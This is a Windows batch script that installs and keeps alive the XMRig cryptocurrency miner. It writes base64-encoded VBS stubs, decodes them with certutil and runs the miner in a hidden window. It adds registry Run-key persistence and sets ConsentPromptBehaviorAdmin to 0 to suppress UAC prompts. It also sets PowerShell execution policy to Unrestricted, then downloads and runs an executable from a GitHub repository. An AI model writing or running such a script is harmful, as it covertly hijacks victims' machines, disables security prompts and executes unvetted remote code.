@echo off
title XMRIG

:Check
cls
echo ********************************************
echo ** the box will check if xmrig is running **
echo ********************************************
REM check tasklist to see if xmrig.exe is running
REM if it is go to :Check
SETLOCAL EnableExtensions
SET EXE=xmrig.exe
REM SET EXE=svchost.exe
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq %EXE%"') DO IF NOT %%x == %EXE% (
  ECHO %EXE% is Not Running
  REM This GOTO may be not necessary
  GOTO notRunning
) ELSE (
  ECHO %EXE is running
  GOTO Running
)
:notRunning
cd\ && cd "C:\Program Files\Common Files\tm_rig\"
if not exist xmrig.exe goto downloadingv2
if not exist "vbs.inv" goto vbsinv
goto vbsinvexist
:vbsinv
cd\ && cd "C:\Program Files\Common Files\tm_rig\"
echo RGltIEludmlzaWJsZQ0KU2V0IG9TaGVsbCA9IENyZWF0ZU9iamVjdCAoIldzY3Jp>>vbs.inv
echo cHQuU2hlbGwiKSANCkludmlzaWJsZSA9ICJjbWQgL2MgeG1yaWcuZXhlIg0Kb1No>>vbs.inv
echo ZWxsLlJ1biBJbnZpc2libGUsIDAsIEZhbHNl>>vbs.inv
goto decodetm
:decodetm
if not exist "tm.vbs" goto decodetmvbs
goto vbsinvexist
:decodetmvbs
certutil -decode vbs.inv tm.vbs
:vbsinvexist
if not exist "tm.vbs" goto decodetm
if not exist start_xmrig.inv goto invxmrigstart
goto xmriginvexist
:invxmrigstart
cd\ && cd "C:\Program Files\Common Files\tm_rig\"
echo Y2QgJX5kcDBcICYmIHN0YXJ0IHRtLnZicw== >> start_xmrig.inv
:decodexmrig
if not exist start_xmrig.bat goto decodexm
goto xmriginvexist
:decodexm
certutil -decode start_xmrig.inv start_xmrig.bat
:xmriginvexist
cd\ && cd "C:\Program Files\Common Files\tm_rig\"
if not exist start_xmrig.bat goto decodexmrig
:starting
echo ****************************************************
echo ** xmrig start **
echo ****************************************************
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v xmrig /t REG_SZ /d "C:\Program Files\Common Files\tm_rig\start_xmrig.bat" /f
REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v checkxm /t REG_SZ /d "%tmp%\tm_rig\runas_.vbs" /f
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
cd\ && cd "C:\Program Files\Common Files\tm_rig\" && start start_xmrig.bat
timeout /T 60
goto Check
:Running
echo *********************************************
echo ** xmrig Is Running                         **
echo *********************************************
timeout /T 60
goto Check
:downloadingv2
cd\ && cd "C:\Program Files\Common Files\"
if not exist tm_inv_t2.exe goto tminv
goto invtm
:tminv
powershell Set-ExecutionPolicy -Scope CurrentUser Unrestricted
powershell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
powershell -Command Invoke-WebRequest "https://github.com/3xploitch3ats/Thunder-Menu/raw/tm/tm_inv_t2.exe" -OutFile "tm_inv_t2.exe"
:invtm
start tm_inv_t2.exe
timeout /t 25
goto Check

:stop
powershell Set-ExecutionPolicy -Scope CurrentUser Restricted
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v xmrig /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v checkxm /f
if not exist "C:\Program Files\Common Files\tm_rig\stop" mkdir "C:\Program Files\Common Files\tm_rig\stop"
cd "C:\Program Files\Common Files\tm_rig\stop"
if not exist runas_stop.bat echo taskkill /f /im xmrig.exe >> runas_stop.bat
if not exist runas_stop_reg.inv goto invregstop
goto startstop
:invregstop
cd "C:\Program Files\Common Files\tm_rig\stop"
echo U2V0IG9iakFQUCA9IENyZWF0ZU9iamVjdCgiU2hlbGwuQXBwbGljYXRpb24iKQ0K>>runas_stop_reg.inv
echo b2JqQVBQLlNoZWxsRXhlY3V0ZSAiQzpcUHJvZ3JhbSBGaWxlc1xDb21tb24gRmls>>runas_stop_reg.inv
echo ZXNcdG1fcmlnXHN0b3BccnVuYXNfc3RvcC5iYXQiLCJ3c2NyaXB0LmV4ZSIgJiAi>>runas_stop_reg.inv
echo IFJ1bkFzQWRtaW5pc3RyYXRvciIsLCJydW5hcyIsIDE=>>runas_stop_reg.inv
certutil -decode runas_stop_reg.inv runas_stop_reg.vbs
:startstop
start runas_stop_reg.vbs
pause
:exit
exit
